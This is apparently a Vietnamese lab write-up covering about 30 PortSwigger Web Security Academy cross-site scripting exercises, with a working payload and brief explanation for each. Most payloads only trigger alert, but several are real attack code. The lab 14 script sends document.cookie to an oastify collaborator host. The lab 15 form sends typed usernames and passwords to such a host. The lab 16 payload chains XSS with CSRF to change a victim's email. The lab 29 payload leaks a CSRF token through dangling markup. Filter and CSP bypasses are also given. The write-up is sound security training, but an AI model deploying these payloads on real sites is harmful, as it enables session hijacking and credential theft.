# Nguyễn Văn Thọ - Cross-site scripting (XSS)


### Bài 1: Reflected XSS into HTML context with nothing encoded
>![](https://i.imgur.com/kQsXptR.png)


Bài lab chứa lỗ hổng reflected XSS trong chức năng `search`, mục tiêu của ta là khai thác để gọi hàm `alert`

Test thử chức năng search ta thấy nó hiện kết quả trả về cùng với dòng chữ `X search results for 'ABC'` như hình dưới

>![](https://i.imgur.com/zGcoi7D.png)

Vậy, input của ta sẽ được trả về hoàn toàn ra giao diện cho ta. Thử với input XSS như sau:

```javascript!
<script>alert(1)</script>
```

Kết quả:

>![](https://i.imgur.com/QQwenzp.png)

>![](https://i.imgur.com/vPJm6Gr.png)


<hr>

### Bài 2: Stored XSS into HTML context with nothing encoded

>![](https://i.imgur.com/B2NMlBw.png)

Trang web chứa lỗ hổng Stored XSS trong chức năng `comment`. Để solve bài lab, ta cần khai thác và gọi hàm `alert`

Kiểm tra chức năng `comment` ta thấy nó có các mục input như sau:

>https://meet.google.com/qib-tprz-vhc

Để test lỗi XSS, ta sẽ dùng payload như bài trên trong tất cả các field input. (Tuy nhiên server chỉ cho phép trên mục `comment`và `name` )

```javascript!
<script>alert(1)</script>
```

Kết quả:

>![](https://i.imgur.com/XZLClQT.png)

>![](https://i.imgur.com/wALSxws.png)


<hr>

### Bài 3: DOM XSS in document.write sink using source location.search

>![](https://i.imgur.com/eaz2jFP.png)

Trang web chưa lỗ hổng `DOM-Based XSS` trong chức năng `search`. Khai thác và gọi hàm `alert`.

Kiểm tra source code ta thấy đoạn javascript như sau:

>![](https://i.imgur.com/d4BckIh.png)

Chương trình lấy kết quả từ tham số `search` và đưa nó vào source cho thẻ `img` sẽ được ghi vào DOM document.

Nội dung ghi sẽ có dạng
```
'<img src="/resources/images/tracker.gif?searchTerms='+query+'">'
```

Payload của ta sẽ nằm khoảng < img src = ".... payload">. Vậy để khai thác ta cần đặt cặp dấu `">` để escape khỏi thẻ img và sau đó đoạn script nằm độc lập và có thể thực thi.

Payload:
```javascript!
"> <script> alert(1) </script>
```

Kết quả:

>![](https://i.imgur.com/8W3h7rV.png)


>![](https://i.imgur.com/38pKs9t.png)


<hr>

### Bài 4: DOM XSS in innerHTML sink using source location.search

>![](https://i.imgur.com/sV57c1v.png)


Bài lab chứa lỗi hổng `DOM-Based XSS` trong chức năng `search`, nó dùng hàm `innerHTML` để thay đổi content của 1 thẻ `div` dựa theo `search` query. Khai thác và gọi hàm alert.

Kiểm tra source code ta thấy đoạn script đó như sau:

>![](https://i.imgur.com/NkGU560.png)

Nó thực hiện ghi giá trị tham số `query` vào thẻ có id là `searchMessage` 

Nội dung thẻ đó như sau:

```htmlembedded!
<span id="searchMessage"></span>
```
Nội dung input của ta sẽ đc đặt thẳng vào nội dung thẻ span này, ta có thể khai thác trực tiếp mà không cần escape.

Vì `innerHTML` không chấp nhận thẻ `script` và cũng không thực thi các sự kiện `svg onload`, các để exploit là dùng thẻ `img` hoặc `iframe`.


Payload
```htmlembedded
<img src='x' onerror=alert(1)>
```

Kết quả:

>![](https://i.imgur.com/ELeq1Nx.png)

> ![](https://i.imgur.com/1GptX78.png)


<hr>

### Bài 5: DOM XSS in jQuery anchor href attribute sink using location.search source

>![](https://i.imgur.com/ZgZKcgQ.png)

Bài lab chứa lỗ hổng `DOM-Based XSS` trong chức năng feedback, nó sử dụng JQuery selector để tìm kiếm phần tử html và thay đổi `href` của phần tử đó bằng giá trị của `search` query. Để solve bài lab, khai thác và alert document.cookie.

Đoạn script xử lý của chức năng đó như sau:

```javascript!
$(function() {
    $('#backLink').attr("href", (new      URLSearchParams(window.location.search)).get('returnPath'));
});
```

Nó thực hiện tìm kiếm phần tử có id = `backLink` và gán `href` bằng giá trị của query `returnPath` trên URL.

Vì không có filter và giá trị của tham số này được đẩy thằng vào thuộc tính `href` nên ta sẽ sửa lại giá trị tham số là `javascript:alert(document.cookie)`

Khi đó trong DOM sẽ thành:

```htmlembedded!
<a id="backLink" href="javascript:alert(document.domain)">Back</a>
```

Kết quả:

>![](https://i.imgur.com/JGdx3rB.png)

> ![](https://i.imgur.com/BgmcCDH.png)

<hr>

### Bài 6: DOM XSS in jQuery selector sink using a hashchange event
>![](https://i.imgur.com/X87xWJd.png)

Bài lab chứa lỗ hổng DOM-Based XSS trong trang chủ, nó sử dụng JQuery selector để tự động lăn tới bài post cho trước. Mục tiêu là khai thác và gọi hàm `print()`

Lướt tới đoạn code javascipt, ta thấy nó kích hoạt sự kiện `hashchange` của jquery để scroll tới bài post.

>![](https://i.imgur.com/cR4ro2k.png)

Ta sử dụng payload sau để trigger XSS trong jquery:
```
#onload="this.src+='<img src=x onerror=print()>'"
```

Kết quả:
>![](https://i.imgur.com/1mByb4n.png)


<hr>

### Bài 7: Reflected XSS into attribute with angle brackets HTML-encoded
>![](https://i.imgur.com/2DXMnHe.png)

Trang web chứa lỗ hổng XSS trong chức năng `search` và dấu ngoặc nhọn được HTML-encoded. Mục tiêu là khai thác XSS và gọi hàm `alert()`.

Ta thấy có 2 vị trí mà input ta được đưa vào

>![](https://i.imgur.com/QNPHKrW.png)

Vì trang web đã thực hiện HTML-encode với dấu `<` nên ta sẽ khai thác thông qua việc escape giá trị thuộc tính `value` của thẻ nơi mà input ta nhập được đưa vào.

Payload:
```javascript!
" autofocus onfocus=alert(1) x="
```

Kết quả:

>![](https://i.imgur.com/ApxN5OK.png)

<hr>

### Bài 8: Stored XSS into anchor href attribute with double quotes HTML-encoded
>![](https://i.imgur.com/ez419iH.png)

Trang web chứa lỗ hổng Store XSS ở chức năng comment, để giải quyết, gọi hàm `alert`.


Thử comment payload XSS ta thấy nó đã bị html-encode

```htmlembedded!
<section class="comment">
<p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            &lt;script&gt;alert(1)&lt;/script&gt; | 16 January 2023
</p>
<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
<p></p>
</section>
```

Tuy nhiên trường `website` lại có hiển thị khác

```htmlembedded!
 <a id="author" href="<script>alert(1)</script>">aaaaaa</a> | 16 January 202
```

Input của ta không bị encode và nằm trong cặp dấu nháy đôi, ta cần bypass để triển khai xss. 

Nhưng dấu nháy đôi đã bị encode như sau:

```htmlembedded!
<a id="author" href="&quot;<script>alert(1)</script>">a</a>
```

Khai thác lại, ta sử dụng kĩ thuật giống 1 bài trên kia trong việc khai thác đường dẫn URL, `javascript:alert(1)`

Kết quả:

>![](https://i.imgur.com/15JUCMr.png)


<hr>

### Bài 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded
>![](https://i.imgur.com/XCTT3nL.png)

Chức năng `search` của trang web bị lỗi reflected XSS và dấu ngoặc nhọn bị encode. Mục tiêu là khai thác xss và gọi hàm `alert()`

Kiểm tra ta thấy ngoài encode và in ra màn hình, trang web còn đem input của ta sử lý tại một hàm khác như sau:

>![](https://i.imgur.com/tFFFduV.png)

ta cần escape input ta khỏi dấu nháy đơn và gọi hàm alert. Payload như sau:

```javascript!
' alert(1) //
```

Kết quả:

>![](https://i.imgur.com/byGCiTt.png)


<hr>

### Bài 10: DOM XSS in document.write sink using source location.search inside a select element

>![](https://i.imgur.com/glPIqZs.png)

Bài lab chứa lỗ hổng `DOM-Based XSS` trong chức năng `stock checker` khi nó sử dụng document.write để ghi giá trị tham số (trên URL) vào DOM. Khai thác và gọi hàm `alert`.

Mở source của trang web lên ta thấy phần code chứa lổ hỗng như sau:

>![](https://i.imgur.com/4GcABGX.png)

Nếu trên URL có `storeId` nó sẽ ghi thêm 1 thẻ `option` vào DOM, nếu không thì nó ghi theo mặc định. (Các cửa hàng London, Paris, Milan).

Chỉ cần thêm url 1 param storeId với giá trị là payload XSS escape thẻ option là ta có thể khai thác được.

Ví dụ ta thêm `&storeId=1` thì nó sẽ ghi vào DOM như sau:

>![](https://i.imgur.com/t8GEerM.png)


Payload:

```htmlembedded!
1</otion> <script>alert(1)</script>
```

Kết quả:

>![](https://i.imgur.com/Gs2bROD.png)

<hr>

### Bài 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

>![](https://i.imgur.com/W58DsID.png)

Bài lab chứa lỗ hổng DOM XSS trong 1 mệnh đề AngularJS của chức năng `search`. Khai thác và gọi hàm `alert`.

Khi có thuộc tính `ng-app` trong html element thì angularjs sẽ tìm các vị trí nằm trong cặp dấu `{{ }}` và thực thi *JavaScript-like code* trong đó.

Chú ý ta thấy thẻ body đã có giá trị đó.

>![](https://i.imgur.com/xldQMt3.png)


Thử `{{ 5*5 }}` ta thấy nó hiển thị ra như sau:

>![](https://i.imgur.com/lKKfGzk.png)

Thử lại với payload khác để kích hoạt xss, ta khởi tạo một đối tượng với hàm constructor, bên trong chứa tham số gây XSS.

```javascript!
{{constructor.constructor('alert(1)')()}}
```
*Here, constructor refers to the scope constructor property which is the Object constructor. constructor.constructor is the Function constructor which allows you to generate a function from a string and therefore execute arbitrary code*

Hàm số được truyền dưới dạng tham số sẽ được evaluate và sẽ thực thi `alert()`
Kết quả

>![](https://i.imgur.com/OCwC9U3.png)


<hr>

### Bài 12: Reflected DOM XSS
>![](https://i.imgur.com/lLIE9HX.png)

Bài lab chứa lỗ hổng `reflected DOM XSS`, kết hợp `reflected` và `Dom` XSS. Khai thác và gọi hàm `alert()`

Kiểm tra javascript của trang web tại đường dẫn `/resources/js/searchResults.js` ta thấy luồng của nó như sau:

```
- Khởi tạo 1 query để kiểm tra dựa theo search query
- eval('var searchResultsObj = ' + this.responseText);
- Gọi hàm displaySearchResults để hiển thị kết quả tìm kiếm.

```

Trong đó responseText là json format có cấu trúc như sau:

```jsonld=
{
   "results":[
      {
         "id":3,
         "title":"Faking It! - InstaCam",
         "image":"blog/posts/7.jpg",
         "summary":"..."
      }
   ],
   "searchTerm":"1"
}

```

Input của ta sẽ được reflected vào `searchTerm`

```jsonld=
{
    "results":[],
    "searchTerm":"aaaaaa"
}
```

Để bypass, ta cần đặt trong payload 1 dấu `"` ở trước và `}//` ở sau.

```jsonld=
{
    "results":[],
    "searchTerm":"\\"aaaa
}//"}
```
<hr>

Vì responseText được đặt trong hàm eval() nên nó sẽ được thực thi nếu có mệnh đề javascript trong đó.

```jsonld=
{
    "results":[],
    "searchTerm":"\\"+alert()
} //"}
```

Kết quả:

>![](https://i.imgur.com/fevhJ6b.png)

<hr>

### Bài 13: Stored DOM XSS
>![](https://i.imgur.com/FVNSTLZ.png)

Bài lab chứa lỗ hổng `stored DOM XSS` trong chức năng `comment`, khai thác và gọi hàm `alert()`

Source javascript của trang web nằm ở đường dẫn `/resources/js/loadCommentsWithVulnerableEscapeHtml.js`

Kiểm tra thì luồng hoạt động của nó giống như bài trước, chỉ khác là giờ nó không dùng hàm `eval` ở đây nữa mà thay vào đó là:

```javascript=
if (this.readyState == 4 && this.status == 200) {
    let comments = JSON.parse(this.responseText);
    displayComments(comments);
}

....
//BÊN CẠNH ĐÓ CŨNG EscapeHTML của comment-author và comment-body
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
firstPElement.innerHTML = newInnerHtml

//Body
if (comment.body) {
...
commentBodyPElement.innerHTML = escapeHTML(comment.body);
...
}
```

Kết quả trả về là dạng json như sau:

```jsonld
[
   {
      "avatar":"",
      "website":"",
      "date":"2023-01-17T05:14:00.036155276Z",
      "body":"aaaaaaaaaaaaa",
      "author":"bbbbbbbbbbbbbbb"
   }
]
```

Chú ý, ta thấy hàm `escapeHTML` của nó được viết như sau:

```javascript=
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
Tuy nhiên hàm `replace` trong javascript chỉ replace first element mà nó match, nên để bypass, ta chỉ cần đặt cặp dấu ngoặc nhọn phía trước payload.

Vì dấu `/` bị esacpe nên ta sử dụng thẻ img như sau.

Payload:

`<><img src=x onerror=alert(1)>`

Kết quả:

>![](https://i.imgur.com/coiNt7g.png)

<hr>

### Bài 14: Exploiting cross-site scripting to steal cookies
>![](https://i.imgur.com/F31uADv.png)

Bài lab chứa lỗ hổng `stored XSS` trong chức năng comment. Khai thác và lấy cookie của người dùng khác, sau đó giả mao họ.

Sử dụng payload sau để tự động điều hướng người dùng tới webhook của ta và lấy cookie trong tham số `c`

```javascript=
<script>document.localtion="https://266fcuwj80b7bf1qzalb0babx23srh.oastify.com/?c="+document.cookie </script>
```

>![](https://i.imgur.com/UzmlYIZ.png)

<hr>

### Bài 15: Exploiting cross-site scripting to capture passwords

>![](https://i.imgur.com/z2qF6SH.png)

Bài lab chứa lỗ hổng `stored XSS` trong chức năng comment. Tìm cách khai thác lấy user credential của người khác và login.

User sẽ nhập username và pasword vào các input ảo của ta (giống CSRF). Và nó sẽ được gửi đến server của ta.

Payload để tạo ra 2 input ảo để user nhập vào và gửi tới webhook của ta:

```htmlembedded
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('https://c1ey6mut4zi765wstt79iet25tbpze.oastify.com/?c='+username.value+':'+this.value
});">
```

Kết quả:

>![](https://i.imgur.com/4cjwfz3.png)

<hr>

### Bài 16: Exploiting XSS to perform CSRF
>![](https://i.imgur.com/oxBcg4W.png)

Bài lab chứa lỗ hổng `stored XSS`, tìm cách kết hợp với CSRF để thay đổi email của user khác.


Ta sẽ điều hướng user tới trang `/my-account` sau đó lấy `csrf token` và tạo 1 post request gửi nó đi (tới `/my-account/change-email`) cùng với email mà ta muốn đổi thành.

Payload như sau.

```javascript=
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://0a0200a204dda6fec36992d6009f004d.web-security-academy.net/my-account')
xhr.send()
xhr.onload = function() {
    var csrf =  this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', 'https://0a0200a204dda6fec36992d6009f004d.web-security-academy.net/my-account/change-email')
    changeReq.send('csrf='+csrf+'&email=abc@gmail.com')
};
</script>
```

Kết quả:

>![](https://i.imgur.com/4QOYjK3.png)


<hr>

### Bài 17: Reflected XSS into HTML context with most tags and attributes blocked
>![](https://i.imgur.com/N0czSBa.png)

Bài lab chứa lỗ hổng `Reflected XSS` trong chức năng search nhưng ứng dụng có sử dụng firewall để chặn tấn công XSS. Bypass và gọi hàm `print()`

Đầu tiên, để soát lại xem firewall có chặn thiếu tag nào hay không, ta sử dụng Burp Intruder để brute force với cheatsheet XSS của Burp.

Kết quả ta thấy tag `<body>` không bị filter. Thử sử dụng tag đó với một số thuộc tính thì thấy web đã filter không cho sử dụng thuộc tính ở đây.

Lại brute-force danh sách thuộc tính thì thấy được thuộc tính `onresize` không bị filter (bên cạnh đó còn có `onratechange` và `onbeforeinput`)

Vì bài lab yêu cầu tự động exploit mà không có can thiệp của victim, nên ta nhúng trang web trong 1 thẻ iframe trên server của ta, kèm theo thuộc tính `onload`=`this.style.width='100px'` để tự động resize và trigger XSS của trang web được nhúng bên trong.

Payload:

```
<iframe src="https://0ab7003e03ddcbc4c5cffad4007500d5.web-security-academy.net/?search=<body onresize=print()> </body>"onload=this.style.width='100px'></iframe> 
```

Kết quả:

>![](https://i.imgur.com/SznFAsj.png)

<hr>

### Bài 18: Reflected XSS into HTML context with all tags blocked except custom ones

>![](https://i.imgur.com/DK2foWH.png)

Bài lab block tất cả HTML tag trừ 1 custom tag. Mục tiêu là khai thác và `alert(document.cookie)`.

Đầu tiên, ta thử như cách bài trên đã làm và không tìm được một thẻ nào có thể khai thác.

Theo đề thì ta phải sử dụng custom tag, tìm kiếm em thấy hướng dẫn như sau:

>![](https://i.imgur.com/8o3QuGi.png)

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

Ta khai báo 1 thẻ `xss` có id = x và tabindex = 1 và url fragment trỏ đến x để thẻ này được focus và do đó kích hoạt được thuộc tính `onfocus`

Payload mà ta sẽ ghi lên server của ta, sau đó gửi đến victim:

```
<script> document.location="https://0a1000c504017750c6f771d000e6002e.web-security-academy.net/?search=%3Cxss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1%3E#x"</script>
```

Kết quả:

>![](https://i.imgur.com/GHnwOKb.png)

<hr>

### Bài 19: Reflected XSS with some SVG markup allowed

>![](https://i.imgur.com/0L1Tk1Y.png)

Trang web chứa lỗ hổng `reflected XSS` đơn giản, trang web đã chặn các tag phổ biến nhưng quên chặn tag `svg`. Mục tiêu là gọi hàm `alert()`

Vẫn như cũ, đầu tiên ta brute force để biết server đã bỏ sót filter những tag nào, ta thấy có các tag sau:

>![](https://i.imgur.com/L7Cv6CD.png)

Ta thấy có thẻ `svg` như mô tả của đề và thẻ `animatetransform` để support markup ảnh svg.

Kiểm tra các event có thể bypass filter, ta lại brute-force và tìm được event `onbegin`.

Tổng kết ta có payload như sau:

```
<svg><animatetransform onbegin="alert(1)"> </svg>
```
Kết quả:

>![](https://i.imgur.com/Z8CSrlu.png)

<hr>

### Bài 20: Reflected XSS in canonical link tag

>![](https://i.imgur.com/KLLyUDC.png)

Bài lab reflect user input trong một link tag và escape dấu ngoặc nhọn. Yêu cầu của bài là khai thác xss gọi hàm `alert()`. Giả sử rằng người dùng nạn nhân sẽ bấm các phím sau:

- <kbd>ALT</kbd>+<kbd>SHIFT</kbd>+<kbd>X</kbd>
- <kbd>CTRL</kbd>+<kbd>ALT</kbd>+<kbd>X</kbd>
- <kbd>ALT</kbd>+<kbd>X</kbd>

Kiểm tra phần đầu header của trang web ta thấy nó có sử dụng canonical tag

>![](https://i.imgur.com/HD1GFwB.png)

**href** của nó trỏ tới đường link chính nó, thử thay đổi url (thêm fragment, query) ta thấy href thay đổi theo.

>![](https://i.imgur.com/7i6OkTG.png)

Vậy tức là ta có thể inject vào vị trí này. Theo đề bài, thì dấu ngoặc nhọn đã bị escape, nên để khai thác ở đây ta sẽ sử dụng các event.

Thử sử dụng `onload` nhưng thấy không thành công, ta sử dụng hint trong đề và biết cần xài accesskey

```
- The accesskey attribute specifies a shortcut key to activate/focus an element.

- The accesskey attribute value must be a single character (a letter or a digit).
```

Payload:

```
'accesskey='x'onclick='alert(1)
```

Reflected XSS

Kết quả:

>![](https://i.imgur.com/KpHo61H.png)

<hr> 

### Bài 21: Reflected XSS into a JavaScript string with single quote and backslash escaped

>![](https://i.imgur.com/yzLO1sF.png)

Bài lab chứa lỗi hổng `reflected xss` trong chức năng search. Single quote and backslashes are escaped. Mục tiêu là khai thác và gọi hàm `alert()`.

Input của ta được truyền vào lệnh khai báo biến như sau:

```javascript=
var searchTerms = 'aaaa';
```

Vì dấu nháy đơn và backslash bị escaped nên ta không bypass được khỏi dấu nháy này. Tuy nhiên tại đây ta có thể đóng thẻ script và mở lại 1 thẻ mới như payload dưới đây.

Payload:

```
</script><script> alert(1)//
```

Kiểu đóng này hoạt động được là vì trình duyệt parse các block HTML trước rồi mới thực thi javascript code trong đó, vô tình nó parse nhầm input của ta thành syntax đóng/mở các block.

Kết quả: 

>![](https://i.imgur.com/erewoaQ.png)

<hr>

### Bài 22: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

>![](https://i.imgur.com/LDXTfGh.png)

Bài lab chứa lỗ hổng `reflected XSS` trong chức năng search. Dấu ngoặc nhọn và 'double' được HTML encode, còn dấu single quote được escape. Tìm cách khai thác và gọi hàm `alert()`

Lần này thì bài lab lại bỏ quên dấu `backslash`, ta sẽ tận dụng nó để bypass;

Payload:

```
\'; alert(1);//
```

Kết quả:

>![](https://i.imgur.com/rbQJqUu.png)


<hr>

### Bài 23: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

>![](https://i.imgur.com/TZRCCUn.png)

Bài lab chứa lỗ hổng `stored XSS` trong chức năng `comment`. Theo tiêu đề thì dấu ngoặc nhọn và nháy đôi bị HTML encoded, single quote và backslash bị escaped. Khai thác và gọi hàm `alert()`

Nếu ta nhập vào 1 địa chỉ website, thì comment của ta sẽ là thẻ `<a>` như sau:

```htmlembedded=
<a id="author" href="http://abc" onclick="var tracker={track(){}};tracker.track('http://abc');">bbbbbbbbbaa</a>
```

Ta cần escape payload địa chỉ website ra khỏi dấu nháy để khi click, event được kích hoạt và gọi hàm alert().

Vì dấu nháy đơn chỉ bị escaped, ta sẽ HTML encode nó và lợi dụng việc trình duyệt sẽ HTML decode các kí tự được mã hóa trong tài liệu trước khi thực thi javascript trong các sự kiện -> dấu nháy ta dù nằm trong chuỗi javascript vẫn được decode.

Payload:

```
&apos;-alert(document.domain)-&apos;
```

Nó sẽ khiến thẻ `a` trông như này

```htmlembedded=
<a id="author" href="http://a&apos;-alert(document.domain)-&apos;" onclick="var tracker={track(){}};tracker.track('http://a&apos;-alert(document.domain)-&apos;');">bbbbbbbbb</a>
```

Kết quả:

>![](https://i.imgur.com/9bKqJdA.png)


<hr>

### Bài 24: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

>![](https://i.imgur.com/THhjRHy.png)

Bài lab chứa lỗ hổng `reflected XSS` trong chức năng search. Ngoặc nhọn, nháy đơn, nháy kép đều bị HTML encoded, dấu backslash và backticks bị escaped.

Vì đề có nhắc rằng: `The reflection occurs inside a template string` nên ta thử payload SSTI.

`${1+1}` 

Và trang web trả về:

>![](https://i.imgur.com/e4pxIFi.png)

Vậy mệnh đề đã được thực thi ở template, thử lại với `${alert(1)}` thì thấy trang web đã thực hiện code javascript trong template để lấy giá trị điền vào vị trí ${ ... }. Nhờ đó ta khai thác thành công.

Kết quả:

>![](https://i.imgur.com/pZCOHPg.png)


<hr>

### Bài 25: Reflected XSS with event handlers and href attributes blocked

>![](https://i.imgur.com/DLUOSwP.png)

Bài lab chứa lỗ hổng `reflected XSS` khi cho phép 1 số thẻ HTLM nằm trong whitelist, tuy nhiên các sự kiện và thuộc tính `href` đã bị block. Tìm cách inject 1 vector để khi click sẽ gọi hàm `alert()`

Đầu tiên, brute-force list các tags trong HTML để biết những thẻ nào nằm trong whitelist, ta có kết quả như sau:

>![](https://i.imgur.com/cX19yym.png)

Chú ý ta thấy đề miêu tả rằng `All events and anchor 'href' attributes are blocked` -> ta cần giải pháp khác (so với các bài trên) để kích hoạt XSS.

Ở đây, thẻ `animate` nằm trong whitelist cho phép animation, lưu ý rằng khi có animation, một số thuộc tính có thể thay đổi giá trị được, cấu trúc kiểu:

```
<animate attributeName=XXX from=ABC to=DEF/>
```


>![](https://i.imgur.com/6XLDzmo.png)

Vì không sử dụng thuộc tính `href` trực tiếp được, ta có thể sử dụng gián tiếp như sau:

```
<svg><a><animate attributeName=href from=javascript:alert(1) to=1 /><text x=20 y=20>Click me</text></a>
```

>![](https://i.imgur.com/1jEMYYl.png)

Ngoài cách trên, khi sử dụng attributeName, ta có thể gán giá trị của nó khi có animation: `values=javascript:alert(1)`

Payload 2: 

```
<svg><a><animate attributeName=href values=javascript:alert(1)/><text x=20 y=20>Click me</text></a>
```

<hr>

### Bài 26: Reflected XSS in a JavaScript URL with some characters blocked

>![](https://i.imgur.com/GL0iPpT.png)

Bài lab reflect input của chúng ta trong một javascript url, ứng dụng filter một số kí tự có thể gây ra XSS. Để solve bài lab, khai thác và gọi được `alert(1337)`

Khi truy cập vào mã nguồn bất kì và xem mã html, ta thấy đường link được reflect ở phần `Back to Blog` như sau:

```htmlembedded=
<div class="is-linkback">
  <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')">Back to Blog</a>
</div>
```

Thử khai thác bằng cách chèn thêm tham số rác vào (vì dùng html fragment không reflect được), ví dụ nhét thêm `&abc=def` 

Để escape khỏi javascript URL, ta đi từng bước 1. Chú ý vì các kí tự đã bị urlencode trước khi reflected, không xử dụng được các `tag` cũng như `event`

Để ý kĩ hơn, ta thấy cặp dấu `( )` đã bị block. Không thể gọi hàm trực tiếp ở đây.

=> Tìm được solution là dùng `throw` như cheatsheet dưới đây

>![](https://i.imgur.com/ThNN1tM.png)



- Đầu tiên escape khỏi phần **body** của fetch bằng `'}`

- Set biến x như là 1 hàm thực hiện chức năng alert và gán toString=x, khi thực hiện `window +'' `, Javascript sẽ gọi toString để cast biến window sang string, và việc gọi tới toString cũng tức là gọi tới x (do toString đã bị ghi đè)=> kích hoạt được alert
```
,x=x=>{throw/**/onerror=alert,1337},toString=x,window+''
```

- Để không break cặp dấu `'}` của thẻ body lúc đầu, ta thêm `,{x:'`

Ghép lại với nhau ta có: 

`&abc='},x=x=>{onerror=alert;throw/**/1},toString=x,window+'',{x:'`

>![](https://i.imgur.com/o3rpmSj.png)


<hr>

### Bài 27: Reflected XSS with AngularJS sandbox escape without strings

>![](https://i.imgur.com/TU43UDk.png)

Bài lab sử dụng AngularJS theo cách khác thường khi mà hàm `$eval` không có sẵn và ta cũng không thể sử dụng bất kì chuỗi nào trong AngularJS.

Mục tiêu: *executes the alert function without using the $eval function.*

Kiểm tra đoạn script trong mã nguồn ta thấy như sau:

>![](https://i.imgur.com/UdHkoWN.png)

Nó sẽ parse `search` query và validate sau đó reflect lại trong thẻ `<h1>` phía dưới. Thử các payload thì thấy các kí tự đặc biệt đã bị HTMLEncoded.

Chú ý rằng với mỗi tham số trên url thì đoạn AngularJS này sẽ thay đổi động theo

>![](https://i.imgur.com/cOn7XKZ.png)

Bài lab sử dụng Sandbox của AngularJS để lọc các ký tự nguy hiểm. Để exploit bài lab này, ta cần escape khỏi sandbox và thực thi code js. Em tìm kiếm và thấy bài research sau của Burp suite.

[**Link**](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)

***Giải thích***: Ý tưởng ở đây là ghi đè một hàm có sẵn trong bộ lọc của Angular, vì AngularJS không hỗ trợ tạo hàm, nên ta sẽ tìm cách ghi lên các hàm đã có sẵn trong JS.


```
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

- Dùng hàm toString() để tạo string mà không cần dấu nháy (đã bị filter)
- Ghi đè method `charAt`
- Gọi hàm `fromCharCode` để dựng lại payload mà không cần dấu nháy

>![](https://i.imgur.com/4SmmuFR.png)

<hr>

### Bài 28: Reflected XSS with AngularJS sandbox escape and CSP


<hr>

### Bài 29: Reflected XSS protected by very strict CSP, with dangling markup attack

>![](https://i.imgur.com/LxI21HN.png)

Bài lab sử dụng 'very strict' CSP để block outgoing request tới các website bên ngoài. Tìm cách bypass CSP và lấy CSRF token của nạn nhân, sau đó thay đổi email của nạn nhân.

Đầu tiên, kiểm tra ta thấy CSP như sau:

```csp!
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

CSP đã chặn nghiêm ngặt các trường để không thể thực thi script trên trang.

Kiểm tra em thấy trong đường dẫn `/my-account`, trường `Email` nhận giá trị lấy từ tham số GET trên url và gán làm giá trị ban đầu của input.

>![](https://i.imgur.com/dnlKmZl.png)


Thử inject để escape khỏi thuộc tính `value` với payload `"> <h1>aaaaaaaa</h1>` ta có kết quả như sau:

>![](https://i.imgur.com/TMg7qEI.png)

Vậy là ta có thể inject vào trang web thông qua vị trí này, tuy nhiên CSP đã chặn ta khỏi các inject gây XSS hoặc gửi truy vấn đến bên ngoài (img src chẳng hạn).

Có một cách khai thác khác là sử dụng kĩ thuật Dangling Markup để lấy thông tin và gửi thông tin đó ra ngoài thông qua việc user click vào `link` or `submit form`, thẻ `base` sẽ trỏ thông tin đó ra theo trang mà ta đi tới.

Ta inject lại giá trị của email như sau:

```wr!
"><a href="https://xxxx.exploit-server.net/exploit">Click </a><base target=';
```

Khi user click vào, sẽ chuyển đến exploit server của ta, giá trị `window.name` của tab này sẽ được gán bằng giá trị của thẻ `base` thu được qua Dangling Markup

Trên exploit server ta đặt script như sau trước khi gửi đến nạn nhân:

```javascript!
<script>
if(window.name) {
	new Image().src='https://rrm1hu1bcs77f0k5daoworziq9w5ku.oastify.com?c='+encodeURIComponent(window.name);
}
else {

document.location ='https://REDIRECT-TO-LAB.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-GOTO-EXPLOIT-SERVER.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';

}
</script>
```

>![](https://i.imgur.com/yQumYfo.png)

Ta thấy rằng trong window.name bây giờ đã chứa CSRF token, đánh cắp tham số này để đổi email.

>![](https://i.imgur.com/zf7na3q.png)


<hr>

### Bài 30: Reflected XSS protected by CSP, with CSP bypass

>![](https://i.imgur.com/OOLhHsZ.png)

Bài lab  dùng CSP nhưng vẫn chứa lỗ hổng reflected XSS, khai thác và bypass CSP để gọi hàm `alert()`

Đầu tiên, dùng Burp Suite để xem CSP của trang web:

>![](https://i.imgur.com/HE5vOWj.png)

Chú ý ta thấy trường `report-uri` trỏ tới `/csp-report` với tham số `token`  ta kiểm soát được (có thể insert trên tham số). Khi một vi phạm policy của CSP xảy ra, thì report sẽ được gửi tới đường dẫn `/csp-report` này, tham số `token` đã được lấy từ url.

Inject tham số này và escape bằng dấu `;` ta có thể tiêm vào policy và sửa.

`1; script-src-elem: 'unsafe-inline'`

> [color=#9ecc4f]script-src-elem directive specifies valid sources for JavaScript <script> elements.
    
Payload:

```
?search=1&token=1; script-src-elem: 'unsafe-inline'
```

>![](https://i.imgur.com/Qyoqdxu.png)

<hr>

